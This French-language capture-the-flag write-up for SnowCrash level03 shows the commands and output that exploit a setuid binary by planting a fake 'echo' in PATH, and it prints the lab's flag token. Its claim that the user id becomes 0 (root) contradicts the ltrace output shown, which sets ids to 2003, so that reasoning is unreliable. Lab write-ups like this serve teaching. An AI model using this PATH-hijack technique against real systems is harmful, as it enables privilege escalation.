# Level03

</br></br>

## Rechercher et exécuter le fichier

```zsh
level03@SnowCrash:~$ ls -al
total 24
dr-x------ 1 level03 level03  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
-r-x------ 1 level03 level03  675 Apr  3  2012 .profile
level03@SnowCrash:~$ ./level03
Exploit me
```

Dans ce cas, lors de l'exécution d'un fichier avec la permission s, il est exécuté avec la permission détenue par ce fichier, donc
Lorsqu'il est exécuté, il est identique à flag03 exécuté.
En d'autres termes, vous n'avez pas besoin de trouver le mot de passe pour faire su flag03.

</br></br>

## ltrace

ltrace est l'une des commandes disponibles sous Linux. C'est un programme, pas une fonction.

ltrace est un outil qui trace et affiche le comportement des fonctions de la bibliothèque appelées par un fichier exécutable. Par conséquent, il peut être utilisé pour le débogage ou l'analyse en traçant les appels de fonction, les paramètres et les valeurs de retour dans un fichier exécutable.

```zsh
level03@SnowCrash:~$ ltrace ./level03
__libc_start_main(0x80484a4, 1, 0xbffff7b4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                                                                            = 2003
geteuid()                                                                                            = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                  = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                  = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                               = 0
+++ exited (status 0) +++
```

```zsh
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                                                        = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                                                        = 0
```

c'est quoi 0 pour user id?

```zsh
level03@SnowCrash:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash // here!!!!!!!!!!
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
```

cela veut dire, on peut executer ce fichier avec user id 2003, mais user id est changé comme 0 (root)

donc, dedans, je vais mettre "getflag" cmd!
</br></br>

## /usr/bin/env

/usr/bin/env est une commande utilisée sous Unix et Linux, et trouve le chemin du programme à exécuter à partir des variables d'environnement et l'exécute.
En d'autres termes, je peux régler l'écho séparément.

En d'autres termes, mettez getflag dans echo et exécutez-le.

</br></br>

## getflag

```zsh
level03@SnowCrash:~$ whereis getflag
getflag: /bin/getflag
```

</br></br>

## Créez un fichier écho et placez le chemin devant PATH

```zsh
level03@SnowCrash:~$ mkdir /tmp/level03
level03@SnowCrash:~$ vim /tmp/level03/echo
#!/bin/bash
/bin/getflag
level03@SnowCrash:~$ chmod +x /tmp/level03/echo
level03@SnowCrash:~$ export PATH="/tmp/level03:$PATH"
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
level03@SnowCrash:~$ su level04
Password:
level04@SnowCrash:~$
```
